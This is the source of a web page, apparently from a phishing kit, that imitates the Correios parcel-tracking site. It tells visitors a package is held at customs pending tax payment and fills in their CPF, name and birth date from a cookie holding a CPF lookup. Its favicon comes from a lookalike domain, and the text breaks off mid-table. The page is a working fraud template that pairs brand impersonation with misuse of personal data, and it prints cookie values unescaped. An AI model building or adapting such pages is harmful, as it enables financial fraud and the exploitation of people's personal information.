<?php
session_start();
date_default_timezone_set('America/Sao_Paulo');
$data_hoje = date('d/m/Y'); // Ex: 19/07/2025
$hora_brasilia = date('H:i'); // Ex: 12:24
$ontem = date('d/m/Y', strtotime('-1 day')); // Ex: 20/07/2025
$ontem2 = date('d/m/Y', strtotime('-2 day')); // Ex: 20/07/2025
$ontem3 = date('d/m/Y', strtotime('-3 day')); // Ex: 20/07/2025

$response = isset($_COOKIE['api_response']) ? json_decode($_COOKIE['api_response'], true) : null;

if ($response && isset($response['status']) && $response['status'] === 'ok') {
    $cpf = $response['dadosCPF']['cpf'];
    $nome = $response['dadosCPF']['nome'];
    $sexo = $response['dadosCPF']['sexo'];
    $dataNascimento = $response['dadosCPF']['dataNascimento'];
   
} elseif ($response && isset($response['Status']) && $response['Status'] === 'error') {

} else {
    echo "Erro: Nenhuma resposta válida encontrada.";
}
?>
<!DOCTYPE html>

<html lang="pt-BR">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="titulo-animado">ias • Pagamento de Taxas Alfandegár</title>
    <script src="./assets/3.4.16"></script>
    <link href="./assets/all.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="https://tarifas-dos-correios.in.ua/app/img/correios-logo-2.png" type="image/x-icon">
    <meta name="savepage-url" content="">
    <meta name="savepage-title" content="Rastreamento">
    <meta name="savepage-state" content="Basic Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
    <meta name="savepage-version" content="33.9">
    <meta name="savepage-comments" content="">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Correios | Rastreamento </title>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const titulo = document.getElementById('titulo-animado');
            // Array com diferentes títulos para randomizar
            const titulos = [
                "Liberação Aduaneira - Pagamento de Taxas",
                "Pagamento de Taxas Alfandegárias",
                "Desembaraço Aduaneiro - Correios",
                "Importação - Liberação de Remessas"
            ];
            // Seleciona um título aleatório
            const textoOriginal = titulos[Math.floor(Math.random() * titulos.length)];
            // Atualiza o título na página
            titulo.textContent = textoOriginal;
            const velocidade = 15000; // velocidade em milissegundos

            function animarTitulo() {
                document.title = textoOriginal;
                let posicao = 0;
                let direcao = 1;

                setInterval(function() {
                    if (posicao > textoOriginal.length) {
                        direcao = -1;
                    } else if (posicao <= 0) {
                        direcao = 1;
                    }

                    posicao += direcao;

                    if (direcao === 1) {
                        // Movendo da direita para a esquerda
                        document.title = textoOriginal.substring(posicao) + " • " + textoOriginal.substring(0, posicao);
                    } else {
                        // Movendo da esquerda para a direita
                        document.title = textoOriginal.substring(textoOriginal.length - posicao) + " • " + textoOriginal.substring(0, textoOriginal.length - posicao);
                    }
                }, 200);
            }

            animarTitulo();
        });
    </script>
    <style>
        .lista-acessibilidade {
            position: absolute;
            background: white;
            list-style: none;
            padding: 10px;
            margin: 0;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            width: 250px;
        }

        .acessibilidade {
            position: relative;
        }

        .bt-link-ic {
            display: flex;
            align-items: center;
            background: none;
            border: none;
            cursor: pointer;
            color: #0082C3;
        }

        .alto-contraste {
            background-color: #000 !important;
            color: #fff !important;
        }

        .alto-contraste * {
            background-color: #000 !important;
            color: #fff !important;
            border-color: #fff !important;
        }

        .alto-contraste a {
            color: #ffff00 !important;
        }

        .alto-contraste img {
            filter: grayscale(100%) !important;
        }

        .largura-maxima {
            background-color: #f0f0f0;
            width: 100%;
        }
    </style>
    <style>
        *,
        ::before,
        ::after {
            --tw-border-spacing-x: 0;
            --tw-border-spacing-y: 0;
            --tw-translate-x: 0;
            --tw-translate-y: 0;
            --tw-rotate: 0;
            --tw-skew-x: 0;
            --tw-skew-y: 0;
            --tw-scale-x: 1;
            --tw-scale-y: 1;
            --tw-pan-x: ;
            --tw-pan-y: ;
            --tw-pinch-zoom: ;
            --tw-scroll-snap-strictness: proximity;
            --tw-gradient-from-position: ;
            --tw-gradient-via-position: ;
            --tw-gradient-to-position: ;
            --tw-ordinal: ;
            --tw-slashed-zero: ;
            --tw-numeric-figure: ;
            --tw-numeric-spacing: ;
            --tw-numeric-fraction: ;
            --tw-ring-inset: ;
            --tw-ring-offset-width: 0px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: rgb(59 130 246 / 0.5);
            --tw-ring-offset-shadow: 0 0 #0000;
            --tw-ring-shadow: 0 0 #0000;
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000;
            --tw-blur: ;
            --tw-brightness: ;
            --tw-contrast: ;
            --tw-grayscale: ;
            --tw-hue-rotate: ;
            --tw-invert: ;
            --tw-saturate: ;
            --tw-sepia: ;
            --tw-drop-shadow: ;
            --tw-backdrop-blur: ;
            --tw-backdrop-brightness: ;
            --tw-backdrop-contrast: ;
            --tw-backdrop-grayscale: ;
            --tw-backdrop-hue-rotate: ;
            --tw-backdrop-invert: ;
            --tw-backdrop-opacity: ;
            --tw-backdrop-saturate: ;
            --tw-backdrop-sepia: ;
            --tw-contain-size: ;
            --tw-contain-layout: ;
            --tw-contain-paint: ;
            --tw-contain-style:
        }

        ::backdrop {
            --tw-border-spacing-x: 0;
            --tw-border-spacing-y: 0;
            --tw-translate-x: 0;
            --tw-translate-y: 0;
            --tw-rotate: 0;
            --tw-skew-x: 0;
            --tw-skew-y: 0;
            --tw-scale-x: 1;
            --tw-scale-y: 1;
            --tw-pan-x: ;
            --tw-pan-y: ;
            --tw-pinch-zoom: ;
            --tw-scroll-snap-strictness: proximity;
            --tw-gradient-from-position: ;
            --tw-gradient-via-position: ;
            --tw-gradient-to-position: ;
            --tw-ordinal: ;
            --tw-slashed-zero: ;
            --tw-numeric-figure: ;
            --tw-numeric-spacing: ;
            --tw-numeric-fraction: ;
            --tw-ring-inset: ;
            --tw-ring-offset-width: 0px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: rgb(59 130 246 / 0.5);
            --tw-ring-offset-shadow: 0 0 #0000;
            --tw-ring-shadow: 0 0 #0000;
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000;
            --tw-blur: ;
            --tw-brightness: ;
            --tw-contrast: ;
            --tw-grayscale: ;
            --tw-hue-rotate: ;
            --tw-invert: ;
            --tw-saturate: ;
            --tw-sepia: ;
            --tw-drop-shadow: ;
            --tw-backdrop-blur: ;
            --tw-backdrop-brightness: ;
            --tw-backdrop-contrast: ;
            --tw-backdrop-grayscale: ;
            --tw-backdrop-hue-rotate: ;
            --tw-backdrop-invert: ;
            --tw-backdrop-opacity: ;
            --tw-backdrop-saturate: ;
            --tw-backdrop-sepia: ;
            --tw-contain-size: ;
            --tw-contain-layout: ;
            --tw-contain-paint: ;
            --tw-contain-style:
        }

        /* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */
        *,
        ::after,
        ::before {
            box-sizing: border-box;
            border-width: 0;
            border-style: solid;
            border-color: #e5e7eb
        }

        ::after,
        ::before {
            --tw-content: ''
        }

        :host,
        html {
            line-height: 1.5;
            -webkit-text-size-adjust: 100%;
            -moz-tab-size: 4;
            tab-size: 4;
            font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            font-feature-settings: normal;
            font-variation-settings: normal;
            -webkit-tap-highlight-color: transparent
        }

        body {
            margin: 0;
            line-height: inherit
        }

        hr {
            height: 0;
            color: inherit;
            border-top-width: 1px
        }

        abbr:where([title]) {
            -webkit-text-decoration: underline dotted;
            text-decoration: underline dotted
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
            font-size: inherit;
            font-weight: inherit
        }

        a {
            color: inherit;
            text-decoration: inherit
        }

        b,
        strong {
            font-weight: bolder
        }

        code,
        kbd,
        pre,
        samp {
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-feature-settings: normal;
            font-variation-settings: normal;
            font-size: 1em
        }

        small {
            font-size: 80%
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline
        }

        sub {
            bottom: -.25em
        }

        sup {
            top: -.5em
        }

        table {
            text-indent: 0;
            border-color: inherit;
            border-collapse: collapse
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            font-family: inherit;
            font-feature-settings: inherit;
            font-variation-settings: inherit;
            font-size: 100%;
            font-weight: inherit;
            line-height: inherit;
            letter-spacing: inherit;
            color: inherit;
            margin: 0;
            padding: 0
        }

        button,
        select {
            text-transform: none
        }

        button,
        input:where([type=button]),
        input:where([type=reset]),
        input:where([type=submit]) {
            -webkit-appearance: button;
            background-color: transparent;
            background-image: none
        }

        :-moz-focusring {
            outline: auto
        }

        :-moz-ui-invalid {
            box-shadow: none
        }

        progress {
            vertical-align: baseline
        }

        ::-webkit-inner-spin-button,
        ::-webkit-outer-spin-button {
            height: auto
        }

        [type=search] {
            -webkit-appearance: textfield;
            outline-offset: -2px
        }

        ::-webkit-search-decoration {
            -webkit-appearance: none
        }

        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit
        }

        summary {
            display: list-item
        }

        blockquote,
        dd,
        dl,
        figure,
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        hr,
        p,
        pre {
            margin: 0
        }

        fieldset {
            margin: 0;
            padding: 0
        }

        legend {
            padding: 0
        }

        menu,
        ol,
        ul {
            list-style: none;
            margin: 0;
            padding: 0
        }

        dialog {
            padding: 0
        }

        textarea {
            resize: vertical
        }

        input::placeholder,
        textarea::placeholder {
            opacity: 1;
            color: #9ca3af
        }

        [role=button],
        button {
            cursor: pointer
        }

        :disabled {
            cursor: default
        }

        audio,
        canvas,
        embed,
        iframe,
        img,
        object,
        svg,
        video {
            display: block;
            vertical-align: middle
        }

        img,
        video {
            max-width: 100%;
            height: auto
        }

        [hidden]:where(:not([hidden=until-found])) {
            display: none
        }

        .container {
            width: 100%
        }

        @media (min-width: 640px) {
            .container {
                max-width: 640px
            }
        }

        @media (min-width: 768px) {
            .container {
                max-width: 768px
            }
        }

        @media (min-width: 1024px) {
            .container {
                max-width: 1024px
            }
        }

        @media (min-width: 1280px) {
            .container {
                max-width: 1280px
            }
        }

        @media (min-width: 1536px) {
            .container {
                max-width: 1536px
            }
        }

        .relative {
            position: relative
        }

        .mx-2 {
            margin-left: 0.5rem;
            margin-right: 0.5rem
        }

        .mx-auto {
            margin-left: auto;
            margin-right: auto
        }

        .mb-1 {
            margin-bottom: 0.25rem
        }

        .mb-4 {
            margin-bottom: 1rem
        }

        .mb-6 {
            margin-bottom: 1.5rem
        }

        .mb-8 {
            margin-bottom: 2rem
        }

        .mr-2 {
            margin-right: 0.5rem
        }

        .mr-3 {
            margin-right: 0.75rem
        }

        .mr-4 {
            margin-right: 1rem
        }

        .mt-1 {
            margin-top: 0.25rem
        }

        .mt-2 {
            margin-top: 0.5rem
        }

        .flex {
            display: flex
        }

        .grid {
            display: grid
        }

        .h-1 {
            height: 0.25rem
        }

        .h-10 {
            height: 2.5rem
        }

        .h-12 {
            height: 3rem
        }

        .h-2 {
            height: 0.5rem
        }

        .h-6 {
            height: 1.5rem
        }

        .h-8 {
            height: 2rem
        }

        .w-1\/3 {
            width: 33.333333%
        }

        .w-2\/3 {
            width: 66.666667%
        }

        .w-6 {
            width: 1.5rem
        }

        .w-auto {
            width: auto
        }

        .flex-1 {
            flex: 1 1 0%
        }

        .transform {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .grid-cols-1 {
            grid-template-columns: repeat(1, minmax(0, 1fr))
        }

        .flex-col {
            flex-direction: column
        }

        .flex-wrap {
            flex-wrap: wrap
        }

        .items-start {
            align-items: flex-start
        }

        .items-center {
            align-items: center
        }

        .justify-end {
            justify-content: flex-end
        }

        .justify-center {
            justify-content: center
        }

        .justify-between {
            justify-content: space-between
        }

        .gap-4 {
            gap: 1rem
        }

        .gap-6 {
            gap: 1.5rem
        }

        .gap-8 {
            gap: 2rem
        }

        .space-x-6> :not([hidden])~ :not([hidden]) {
            --tw-space-x-reverse: 0;
            margin-right: calc(1.5rem * var(--tw-space-x-reverse));
            margin-left: calc(1.5rem * calc(1 - var(--tw-space-x-reverse)))
        }

        .space-y-2\.5> :not([hidden])~ :not([hidden]) {
            --tw-space-y-reverse: 0;
            margin-top: calc(0.625rem * calc(1 - var(--tw-space-y-reverse)));
            margin-bottom: calc(0.625rem * var(--tw-space-y-reverse))
        }

        .space-y-3> :not([hidden])~ :not([hidden]) {
            --tw-space-y-reverse: 0;
            margin-top: calc(0.75rem * calc(1 - var(--tw-space-y-reverse)));
            margin-bottom: calc(0.75rem * var(--tw-space-y-reverse))
        }

        .space-y-4> :not([hidden])~ :not([hidden]) {
            --tw-space-y-reverse: 0;
            margin-top: calc(1rem * calc(1 - var(--tw-space-y-reverse)));
            margin-bottom: calc(1rem * var(--tw-space-y-reverse))
        }

        .overflow-hidden {
            overflow: hidden
        }

        .whitespace-nowrap {
            white-space: nowrap
        }

        .break-words {
            overflow-wrap: break-word
        }

        .rounded-full {
            border-radius: 9999px
        }

        .rounded-lg {
            border-radius: 0.5rem
        }

        .border {
            border-width: 1px
        }

        .border-b {
            border-bottom-width: 1px
        }

        .border-l-4 {
            border-left-width: 4px
        }

        .border-t {
            border-top-width: 1px
        }

        .border-blue-500 {
            --tw-border-opacity: 1;
            border-color: rgb(59 130 246 / var(--tw-border-opacity, 1))
        }

        .border-gray-100 {
            --tw-border-opacity: 1;
            border-color: rgb(243 244 246 / var(--tw-border-opacity, 1))
        }

        .border-gray-200 {
            --tw-border-opacity: 1;
            border-color: rgb(229 231 235 / var(--tw-border-opacity, 1))
        }

        .border-red-500 {
            --tw-border-opacity: 1;
            border-color: rgb(239 68 68 / var(--tw-border-opacity, 1))
        }

        .bg-\[\#F8F8F8\] {
            --tw-bg-opacity: 1;
            background-color: rgb(248 248 248 / var(--tw-bg-opacity, 1))
        }

        .bg-blue-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(219 234 254 / var(--tw-bg-opacity, 1))
        }

        .bg-blue-50 {
            --tw-bg-opacity: 1;
            background-color: rgb(239 246 255 / var(--tw-bg-opacity, 1))
        }

        .bg-blue-600 {
            --tw-bg-opacity: 1;
            background-color: rgb(37 99 235 / var(--tw-bg-opacity, 1))
        }

        .bg-gray-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(243 244 246 / var(--tw-bg-opacity, 1))
        }

        .bg-gray-300 {
            --tw-bg-opacity: 1;
            background-color: rgb(209 213 219 / var(--tw-bg-opacity, 1))
        }

        .bg-gray-50 {
            --tw-bg-opacity: 1;
            background-color: rgb(249 250 251 / var(--tw-bg-opacity, 1))
        }

        .bg-red-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(254 226 226 / var(--tw-bg-opacity, 1))
        }

        .bg-red-50 {
            --tw-bg-opacity: 1;
            background-color: rgb(254 242 242 / var(--tw-bg-opacity, 1))
        }

        .bg-red-500 {
            --tw-bg-opacity: 1;
            background-color: rgb(239 68 68 / var(--tw-bg-opacity, 1))
        }

        .bg-white {
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255 / var(--tw-bg-opacity, 1))
        }

        .bg-yellow-400 {
            --tw-bg-opacity: 1;
            background-color: rgb(250 204 21 / var(--tw-bg-opacity, 1))
        }

        .p-2 {
            padding: 0.5rem
        }

        .p-4 {
            padding: 1rem
        }

        .p-6 {
            padding: 1.5rem
        }

        .px-4 {
            padding-left: 1rem;
            padding-right: 1rem
        }

        .px-8 {
            padding-left: 2rem;
            padding-right: 2rem
        }

        .py-2 {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem
        }

        .py-3 {
            padding-top: 0.75rem;
            padding-bottom: 0.75rem
        }

        .py-5 {
            padding-top: 1.25rem;
            padding-bottom: 1.25rem
        }

        .py-8 {
            padding-top: 2rem;
            padding-bottom: 2rem
        }

        .pb-1 {
            padding-bottom: 0.25rem
        }

        .pb-2 {
            padding-bottom: 0.5rem
        }

        .text-center {
            text-align: center
        }

        .text-right {
            text-align: right
        }

        .font-mono {
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
        }

        .font-sans {
            font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"
        }

        .text-2xl {
            font-size: 1.5rem;
            line-height: 2rem
        }

        .text-base {
            font-size: 1rem;
            line-height: 1.5rem
        }

        .text-lg {
            font-size: 1.125rem;
            line-height: 1.75rem
        }

        .text-sm {
            font-size: 0.875rem;
            line-height: 1.25rem
        }

        .text-xl {
            font-size: 1.25rem;
            line-height: 1.75rem
        }

        .text-xs {
            font-size: 0.75rem;
            line-height: 1rem
        }

        .font-bold {
            font-weight: 700
        }

        .font-medium {
            font-weight: 500
        }

        .font-semibold {
            font-weight: 600
        }

        .uppercase {
            text-transform: uppercase
        }

        .text-\[\#00416B\] {
            --tw-text-opacity: 1;
            color: rgb(0 65 107 / var(--tw-text-opacity, 1))
        }

        .text-\[\#0082C3\] {
            --tw-text-opacity: 1;
            color: rgb(0 130 195 / var(--tw-text-opacity, 1))
        }

        .text-\[\#444444\] {
            --tw-text-opacity: 1;
            color: rgb(68 68 68 / var(--tw-text-opacity, 1))
        }

        .text-\[\#666666\] {
            --tw-text-opacity: 1;
            color: rgb(102 102 102 / var(--tw-text-opacity, 1))
        }

        .text-black {
            --tw-text-opacity: 1;
            color: rgb(0 0 0 / var(--tw-text-opacity, 1))
        }

        .text-blue-600 {
            --tw-text-opacity: 1;
            color: rgb(37 99 235 / var(--tw-text-opacity, 1))
        }

        .text-gray-500 {
            --tw-text-opacity: 1;
            color: rgb(107 114 128 / var(--tw-text-opacity, 1))
        }

        .text-gray-600 {
            --tw-text-opacity: 1;
            color: rgb(75 85 99 / var(--tw-text-opacity, 1))
        }

        .text-gray-700 {
            --tw-text-opacity: 1;
            color: rgb(55 65 81 / var(--tw-text-opacity, 1))
        }

        .text-gray-800 {
            --tw-text-opacity: 1;
            color: rgb(31 41 55 / var(--tw-text-opacity, 1))
        }

        .text-red-600 {
            --tw-text-opacity: 1;
            color: rgb(220 38 38 / var(--tw-text-opacity, 1))
        }

        .text-white {
            --tw-text-opacity: 1;
            color: rgb(255 255 255 / var(--tw-text-opacity, 1))
        }

        .opacity-80 {
            opacity: 0.8
        }

        .shadow {
            --tw-shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
            --tw-shadow-colored: 0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color);
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .shadow-md {
            --tw-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
            --tw-shadow-colored: 0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .shadow-none {
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .shadow-sm {
            --tw-shadow: 0 1px 2px 0 rgb(0 0 0 / 0.05);
            --tw-shadow-colored: 0 1px 2px 0 var(--tw-shadow-color);
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .transition {
            transition-property: color, background-color, border-color, fill, stroke, opacity, box-shadow, transform, filter, -webkit-text-decoration-color, -webkit-backdrop-filter;
            transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;
            transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter, -webkit-text-decoration-color, -webkit-backdrop-filter;
            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
            transition-duration: 150ms
        }

        .transition-colors {
            transition-property: color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;
            transition-property: color, background-color, border-color, text-decoration-color, fill, stroke;
            transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;
            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
            transition-duration: 150ms
        }

        .duration-300 {
            transition-duration: 300ms
        }

        .ease-in-out {
            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1)
        }

        .hover\:scale-105:hover {
            --tw-scale-x: 1.05;
            --tw-scale-y: 1.05;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .hover\:bg-yellow-500:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(234 179 8 / var(--tw-bg-opacity, 1))
        }

        .hover\:font-bold:hover {
            font-weight: 700
        }

        .hover\:text-\[\#00416B\]:hover {
            --tw-text-opacity: 1;
            color: rgb(0 65 107 / var(--tw-text-opacity, 1))
        }

        .hover\:text-\[\#2F4F7F\]:hover {
            --tw-text-opacity: 1;
            color: rgb(47 79 127 / var(--tw-text-opacity, 1))
        }

        .hover\:text-\[\#FBBB21\]:hover {
            --tw-text-opacity: 1;
            color: rgb(251 187 33 / var(--tw-text-opacity, 1))
        }

        .hover\:underline:hover {
            -webkit-text-decoration-line: underline;
            text-decoration-line: underline
        }

        @media (min-width: 640px) {
            .sm\:w-1\/3 {
                width: 33.333333%
            }

            .sm\:w-2\/3 {
                width: 66.666667%
            }

            .sm\:flex-row {
                flex-direction: row
            }

            .sm\:items-center {
                align-items: center
            }
        }

        @media (min-width: 768px) {
            .md\:grid-cols-2 {
                grid-template-columns: repeat(2, minmax(0, 1fr))
            }

            .md\:grid-cols-4 {
                grid-template-columns: repeat(4, minmax(0, 1fr))
            }

            .md\:flex-row {
                flex-direction: row
            }

            .md\:justify-end {
                justify-content: flex-end
            }
        }
    </style>
</head>

<body class="bg-gray-100">
    <div class="largura-maxima flex">
        <div class="acessibilidade" style="display: flex; align-items: center; background-color: #f0f0f0; padding: 5px 10px; width: 100%;">
            <button id="botao-acessibilidade" class="bt-link-ic bt-acessibilidade" style="display: flex; align-items: center; background: none; border: none; cursor: pointer; color: #0082C3;">
                <span>Acessibilidade</span>
                <i class="fas fa-chevron-right rotacao-90" style="margin-left: 5px; transform: rotate(90deg);"></i>
            </button>
            <ul id="lista-itens-acessibilidade" class="lista-acessibilidade" style="display: none; position: absolute; top: 30px; background-color: white; list-style: none; padding: 10px; margin: 0; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 1000;">
                <li style="margin-bottom: 8px;">
                    <a id="link-contraste" href="#" accesskey="c" style="display: flex; align-items: center; text-decoration: none; color: #333;">
                        <i class="fas fa-adjust" style="margin-right: 5px;"></i>
                        Alto Contraste
                    </a>
                </li>
                <li style="margin-bottom: 8px;">
                    <!-- Código do Vlibras do governo Federal-->
                    <div vw="" class="enabled">
                        <div vw-access-button="" class="active">
                            <img class="access-button" data-src="assets/access_icon.svg" alt="Conteúdo acessível em Libras usando o VLibras Widget com opções dos Avatares Ícaro, Hosana ou Guga." src="./assets/vlibras.png">
                            <img class="pop-up" data-src="assets/access_popup.jpg" alt="Conteúdo acessível em Libras usando o VLibras Widget com opções dos Avatares Ícaro, Hosana ou Guga.">
                            <p>VLibras</p>
                        </div>
                    </div>
                </li>
            </ul>
        </div>
    </div>

    <header style="background-color: #ebebeb;" class="shadow">
        <div class="px-4 py-2 flex justify-between items-center">
            <div class="flex items-center">
                <button class="text-blue-600 text-2xl mr-4">
                    <i class="fas fa-bars"></i>
                </button>
                <img src="./assets/correios.svg" alt="Correios logo" class="h-8">
            </div>
            <div class="text-base text-gray-500 flex justify-end">
                <object data="./assets/entrar-cor.svg" type="image/svg+xml" class="h-12 mr-2"></object>
                <a class="text-[#0082C3] hover:text-[#2F4F7F] hover:font-bold flex items-center">Entrar</a>
            </div>
        </div>
    </header>

    <div class="bg-yellow-400 h-1"></div>

    <nav class="bg-gray-50 py-2">
        <div class="container mx-auto px-4">
            <a class="text-blue-600 hover">Portal Correios</a>
            <i class="fas fa-chevron-right text-blue-600 mx-2"></i>
            <a class="text-blue-600 hover">Rastreamento</a>
            <i class="fas fa-chevron-right text-blue-600 mx-2"></i>
        </div>
    </nav>

    <main class="container mx-auto px-4 py-8">
        <h1 class="text-blue-600 text-2xl font-semibold mb-6">Rastreamento</h1>

        <!-- Seção principal reformulada -->
        <div class="bg-white rounded-lg shadow-md overflow-hidden mb-8">
            <!-- Número de rastreio em destaque -->
            <div class="bg-blue-600 text-white p-4">
                <div class="flex justify-between items-center">
                    <div>
                        <h2 class="text-xl font-bold">Código de Rastreamento</h2>
                        <p class="text-2xl font-mono mt-1" id="codigo-rastreio">BR748077443BR</p>
                    </div>
                    <div class="text-right">
                        <p class="text-sm opacity-80">Atualizado em</p>
                        <p class="font-bold" id="data-hora"><?php echo $data_hoje;?> <?php echo $hora_brasilia;?></p>
                    </div>
                </div>
            </div>

            <!-- Status do pacote com barra de progresso -->
            <div class="p-6 bg-gray-50 border-b">
                <h2 class="text-lg font-semibold text-gray-800 mb-4">Status: <span class="text-red-600 font-bold">Pendente</span></h2>

                <div class="relative mb-8">
                    <div class="overflow-hidden h-2 text-xs flex bg-gray-300 rounded-full">
                        <div style="width: 50%" class="shadow-none flex flex-col text-center whitespace-nowrap text-white justify-center bg-blue-600"></div>
                    </div>

                    <div class="flex text-xs text-gray-600 mt-2 justify-between">
                        <div class="text-center">
                            <div class="w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center mx-auto mb-1">
                                <i class="fas fa-check"></i>
                            </div>
                            <span>Enviado</span>
                        </div>
                        <div class="text-center">
                            <div class="w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center mx-auto mb-1">
                                <i class="fas fa-check"></i>
                            </div>
                            <span>Alfândega</span>
                        </div>
                        <div class="text-center">
                            <div class="w-6 h-6 bg-red-500 text-white rounded-full flex items-center justify-center mx-auto mb-1">
                                <i class="fas fa-exclamation-triangle"></i>
                            </div>
                            <span>Pendente</span>
                        </div>
                        <div class="text-center">
                            <div class="w-6 h-6 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center mx-auto mb-1">
                                <i class="fas fa-truck"></i>
                            </div>
                            <span>Em rota</span>
                        </div>
                        <div class="text-center">
                            <div class="w-6 h-6 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center mx-auto mb-1">
                                <i class="fas fa-home"></i>
                            </div>
                            <span>Entregue</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Grid de informações -->
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 p-6">
                <!-- Card com informações do titular -->
                <div class="bg-white rounded-lg border border-gray-200 shadow-sm overflow-hidden">
                    <div class="bg-blue-50 px-4 py-2 border-b border-gray-200">
                        <h3 class="text-blue-600 font-semibold">
                            <i class="fas fa-user-circle mr-2"></i>Informações do Titular
                        </h3>
                    </div>
                    <div class="p-4 space-y-3">
                        <!-- CPF -->
                        <div class="flex flex-col sm:flex-row sm:items-center border-b border-gray-100 pb-2">
                            <div class="sm:w-1/3 font-medium text-gray-600">CPF:</div>
                            <div class="sm:w-2/3 break-words">
                                <p><?php echo $cpf;?></p>
                            </div>
                        </div>

                        <!-- Nome -->
                        <div class="flex flex-col sm:flex-row sm:items-center border-b border-gray-100 pb-2">
                            <div class="sm:w-1/3 font-medium text-gray-600">Nome:</div>
                            <div class="sm:w-2/3 break-words">
                                <p><?php echo $nome;?></p>
                            </div>
                        </div>

                        <!-- Nascimento -->
                        <div class="flex flex-col sm:flex-row sm:items-center border-b border-gray-100 pb-2">
                            <div class="sm:w-1/3 font-medium text-gray-600">Nascimento:</div>
                            <div class="sm:w-2/3 break-words">
                                <p><?php echo $dataNascimento;?></p>
                            </div>
                        </div>

                        <!-- Comprovante -->
                        <div class="flex flex-col sm:flex-row sm:items-center">
                            <div class="sm:w-1/3 font-medium text-gray-600">Comprovante:</div>
                            <div class="sm:w-2/3 break-words" id="comprovante">139C1.14F7E.19426.16953</div>
                        </div>
                    </div>
                </div>

                <!-- Card com valores de taxação -->
                <div class="bg-white rounded-lg border border-gray-200 shadow-sm overflow-hidden">
                    <div class="bg-red-50 px-4 py-2 border-b border-gray-200">
                        <h3 class="text-red-600 font-semibold">
                            <i class="fas fa-exclamation-circle mr-2"></i>Valores de Taxação
                        </h3>
                    </div>
                    <div class="p-4">
                        <div class="flex border-b border-gray-100 py-2">
                            <div class="w-2/3 font-medium text-gray-600">Imposto de Importação:</div>
                            <div class="w-1/3 text-right">R$ 63,23</div>
                        </div>
                        <div class="flex border-b border-gray-100 py-2">
                            <div class="w-2/3 font-medium text-gray-600">IPI:</div>
                            <div class="w-1/3 text-right">R$ 41,85</div>
                        </div>
                        <div class="flex py-2 font-bold">
